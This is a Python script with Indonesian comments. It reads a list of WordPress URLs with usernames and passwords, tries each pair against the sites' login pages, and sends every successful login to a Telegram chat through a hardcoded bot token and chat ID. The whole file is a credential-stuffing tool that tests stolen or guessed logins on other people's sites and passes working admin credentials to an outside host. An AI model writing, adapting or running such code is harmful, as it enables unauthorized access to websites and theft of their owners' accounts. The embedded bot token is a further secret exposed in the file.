import requests
from bs4 import BeautifulSoup
from telegram import Bot
import sys

# === Konfigurasi Telegram ===
TELEGRAM_TOKEN = '8862509986:AAE0Jn_b_XHr4mQvQ0xpRE8hPDHBRdQ8IKk'
CHAT_ID = '-1003916774614'
bot = Bot(token=TELEGRAM_TOKEN)

# === Ambil nama file dari argumen ===
if len(sys.argv) != 2:
    print(f"Usage: python3 {sys.argv[0]} <nama_file.txt>")
    sys.exit()

filename = sys.argv[1]

# === Baca file target ===
try:
    with open(filename, "r") as f:
        targets = f.readlines()
except FileNotFoundError:
    print(f"[!] File '{filename}' tidak ditemukan.")
    sys.exit()

def try_login(url, username, password):
    session = requests.Session()

    if "/wp-admin/" in url:
        login_url = url.replace("/wp-admin/", "/wp-login.php")
    else:
        login_url = url

    try:
        r = session.get(login_url, timeout=10)
        if r.status_code != 200:
            print(f"[!] Gagal mengakses {login_url}")
            return

        payload = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log Masuk",
            "redirect_to": url.replace("/wp-admin/", "/wp-admin/index.php"),
            "testcookie": "1"
        }
        headers = {
            "User-Agent": "Mozilla/5.0"
        }

        response = session.post(login_url, data=payload, headers=headers, timeout=10, allow_redirects=True)

        if "wp-toolbar" in response.text or "/wp-admin/profile.php" in response.url:
            print(f"[✓] Sukses login di {url} sebagai {username}")
            msg = f"[Login WordPress Sukses]\nURL: {url}\nUser: {username}\nPass: {password}"
            bot.send_message(chat_id=CHAT_ID, text=msg)
        else:
            print(f"[-] Gagal login: {url} ({username})")
    except Exception as e:
        print(f"[!] Error saat login ke {url}: {e}")

# === Proses target ===
for line in targets:
    parts = line.strip().split("|")
    if len(parts) != 3:
        print(f"[!] Format salah: {line.strip()}")
        continue
    url, user, pwd = parts
    try_login(url, user, pwd)
